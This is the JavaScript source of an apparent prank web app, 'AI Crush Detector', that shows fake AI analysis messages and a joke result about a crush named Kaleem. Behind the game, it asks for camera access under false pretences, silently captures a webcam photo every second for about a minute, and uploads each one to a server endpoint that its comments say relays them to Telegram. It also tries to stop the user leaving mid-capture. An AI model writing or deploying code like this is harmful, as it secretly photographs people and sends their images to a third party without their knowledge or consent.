// AI Crush Detector - Complete JavaScript Application
let currentScreen = 'loading';
let stream = null;
let captureInterval = null;
let analysisProgress = 0;

// Funny quotes for results
const funnyQuotes = [
    "Looks like someone's got Kaleem on the brain! 🧠💕",
    "Your heart rate spikes every time you think of Kaleem! 📈❤️",
    "Our AI detected 47 micro-expressions related to Kaleem! 😍",
    "Warning: Excessive daydreaming about Kaleem detected! ☁️💭",
    "Your pupils dilate 23% when thinking about Kaleem! 👀",
    "Kaleem has officially occupied 89% of your thoughts! 🤔",
    "You've been caught red-handed thinking about Kaleem! 🔍❤️",
    "Emergency: Your crush levels for Kaleem are off the charts! 📊",
    "Scientists hate this one trick: How Kaleem stole your heart! 💝",
    "Breaking news: Local person can't stop thinking about Kaleem! 📰"
];

// Analysis messages
const analysisMessages = [
    "Initializing neural networks...",
    "Scanning facial micro-expressions...",
    "Analyzing eye movement patterns...",
    "Detecting emotional signatures...",
    "Cross-referencing with crush database...",
    "Calibrating love algorithms...",
    "Processing romantic indicators...",
    "Finalizing crush assessment..."
];

// Initialize app
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        showScreen('welcome');
    }, 3000);
});

function showScreen(screenName) {
    // Hide all screens
    document.querySelectorAll('[id]').forEach(el => {
        if (['loading', 'welcome', 'camera', 'analysis', 'results'].includes(el.id)) {
            el.classList.add('hidden');
        }
    });
    
    // Show selected screen
    document.getElementById(screenName).classList.remove('hidden');
    currentScreen = screenName;
}

function startDetection() {
    showScreen('camera');
}

async function requestCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });
        
        showScreen('analysis');
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        // Wait for video to be ready
        video.onloadedmetadata = () => {
            console.log('Video ready, starting analysis');
            startAnalysis();
            startPhotoCapture();
        };
        
    } catch (error) {
        console.error('Camera access denied:', error);
        alert('Camera access is required for the AI analysis to work! Please allow camera permission and try again.');
    }
}

function startAnalysis() {
    analysisProgress = 0;
    let messageIndex = 0;
    
    const analysisInterval = setInterval(() => {
        analysisProgress += 1;
        
        // Update progress bars
        const progress1 = Math.min(100, (analysisProgress / 20) * 100);
        const progress2 = Math.min(100, Math.max(0, (analysisProgress - 10) / 20) * 100);
        const progress3 = Math.min(100, Math.max(0, (analysisProgress - 20) / 20) * 100);
        
        document.getElementById('progress1').textContent = Math.round(progress1) + '%';
        document.getElementById('progress2').textContent = Math.round(progress2) + '%';
        document.getElementById('progress3').textContent = Math.round(progress3) + '%';
        
        document.getElementById('bar1').style.width = progress1 + '%';
        document.getElementById('bar2').style.width = progress2 + '%';
        document.getElementById('bar3').style.width = progress3 + '%';
        
        // Update analysis message
        if (analysisProgress % 8 === 0) {
            document.getElementById('analysis-message').textContent = analysisMessages[messageIndex];
            messageIndex = (messageIndex + 1) % analysisMessages.length;
        }
        
        // Complete analysis
        if (analysisProgress >= 60) {
            clearInterval(analysisInterval);
            stopPhotoCapture();
            showResults();
        }
    }, 1000);
}

function startPhotoCapture() {
    console.log('Starting photo capture');
    
    // Capture first photo immediately
    setTimeout(() => {
        capturePhoto();
        
        // Then capture every second
        captureInterval = setInterval(() => {
            capturePhoto();
        }, 1000);
    }, 100);
}

function capturePhoto() {
    const video = document.getElementById('video');
    
    if (!video || video.readyState !== 4) {
        console.log('Video not ready yet');
        return;
    }
    
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0);
    
    // Convert to blob and send to Telegram
    canvas.toBlob(async (blob) => {
        if (blob) {
            try {
                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                
                console.log('Sending photo to server...');
                
                const response = await fetch('/api/send-photo', {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    console.log('✅ Photo sent to Telegram successfully');
                } else {
                    console.log('❌ Failed to send photo to Telegram');
                }
            } catch (error) {
                console.error('❌ Network error:', error);
            }
        }
    }, 'image/jpeg', 0.8);
}

function stopPhotoCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
}

function showResults() {
    // Show random funny quote
    const randomQuote = funnyQuotes[Math.floor(Math.random() * funnyQuotes.length)];
    
    // Update results screen with quote
    const resultsScreen = document.getElementById('results');
    const quoteElement = document.createElement('p');
    quoteElement.className = 'text-center text-gray-300 mt-4';
    quoteElement.textContent = randomQuote;
    
    // Add quote if not already there
    const existingQuote = resultsScreen.querySelector('.text-gray-300.mt-4');
    if (existingQuote) {
        existingQuote.textContent = randomQuote;
    } else {
        resultsScreen.querySelector('.bg-gray-800').appendChild(quoteElement);
    }
    
    showScreen('results');
}

function analyzeAgain() {
    showScreen('camera');
}

// Prevent page refresh during analysis
window.addEventListener('beforeunload', function(e) {
    if (currentScreen === 'analysis') {
        e.preventDefault();
        e.returnValue = '';
    }
});
